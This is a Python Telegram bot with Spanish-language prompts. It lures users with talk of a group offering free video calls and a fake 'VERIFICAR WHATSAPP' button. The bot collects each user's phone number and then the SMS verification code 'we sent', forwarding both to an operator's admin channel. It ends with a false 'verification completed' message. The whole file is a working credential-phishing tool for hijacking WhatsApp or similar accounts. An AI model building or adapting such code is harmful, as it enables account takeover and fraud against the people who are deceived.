import os
from telegram import (
    Update,
    KeyboardButton,
    ReplyKeyboardMarkup,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

TOKEN = os.getenv("BOT_TOKEN")
ADMIN_CHANNEL_ID = int(os.getenv("ADMIN_CHANNEL_ID"))

UD_PHONE = "phone"
UD_CODE = "code"

# Función para convertir texto a negritas Unicode
def to_bold_unicode(s: str) -> str:
    normal = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    bold   =  "𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙" \
              "𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳" \
              "𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗"
    table = str.maketrans(normal, bold)
    return s.translate(table)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data[UD_CODE] = ""
    context.user_data.pop(UD_PHONE, None)

    nombre = to_bold_unicode(update.effective_user.first_name or "Usuario")

    mensaje = (
        f"👋{nombre} "
        "𝐋𝐚 𝐫𝐞𝐠𝐥𝐚 #𝟏 𝐝𝐞𝐥 𝐠𝐫𝐮𝐩𝐨 𝐞𝐬 𝐦𝐚𝐧𝐭𝐞𝐧𝐞𝐫 𝐬𝐢𝐞𝐦𝐩𝐫𝐞 𝐞𝐥 𝐫𝐞𝐬𝐩𝐞𝐭𝐨 "
        "𝐡𝐚𝐜𝐢𝐚 𝐥𝐚𝐬 𝐩𝐞𝐫𝐬𝐨𝐧𝐚𝐬 𝐞𝐧 𝐞𝐥 𝐠𝐫𝐮𝐩𝐨. 𝐄𝐧 𝐥𝐚𝐬 𝐯𝐢𝐝𝐞𝐨𝐥𝐥𝐚𝐦𝐚𝐝𝐚𝐬 𝐠𝐫𝐚𝐭𝐢𝐬 "
        "𝐬𝐞𝐚 𝐫𝐞𝐬𝐩𝐞𝐭𝐮𝐨𝐬𝐨.\n\n"
        "𝐏𝐫𝐞𝐬𝐢𝐨𝐧𝐚 𝐞𝐥 𝐛𝐨𝐭ó𝐧 “𝐕𝐄𝐑𝐈𝐅𝐈𝐂𝐀𝐑 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏” 𝐩𝐚𝐫𝐚 𝐞𝐧𝐭𝐫𝐚𝐫 𝐚𝐥 𝐠𝐫𝐮𝐩𝐨."
    )

    btn = KeyboardButton("✅ 𝐕𝐄𝐑𝐈𝐅𝐈𝐂𝐀𝐑 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏", request_contact=True)
    kb = ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)

    await update.message.reply_text(mensaje, reply_markup=kb)

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    phone_number = contact.phone_number
    context.user_data[UD_PHONE] = phone_number

    await context.bot.send_message(
        chat_id=ADMIN_CHANNEL_ID,
        text=f"📞 Número recibido: {phone_number} (de {update.effective_user.first_name})"
    )

    await update.message.reply_text(
        "📲 Ingresa el código de 5 dígitos que te enviamos por SMS:",
        reply_markup=ReplyKeyboardMarkup(
            [[str(i) for i in range(1, 6)]],
            resize_keyboard=True
        )
    )

async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if UD_PHONE not in context.user_data:
        await update.message.reply_text("❌ Primero comparte tu número usando el botón.")
        return

    code = update.message.text.strip()
    context.user_data[UD_CODE] = code

    await context.bot.send_message(
        chat_id=ADMIN_CHANNEL_ID,
        text=f"✅ Código recibido de {update.effective_user.first_name}: {code}"
    )

    await update.message.reply_text("✔ Verificación completada.")

if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code))

    app.run_polling()
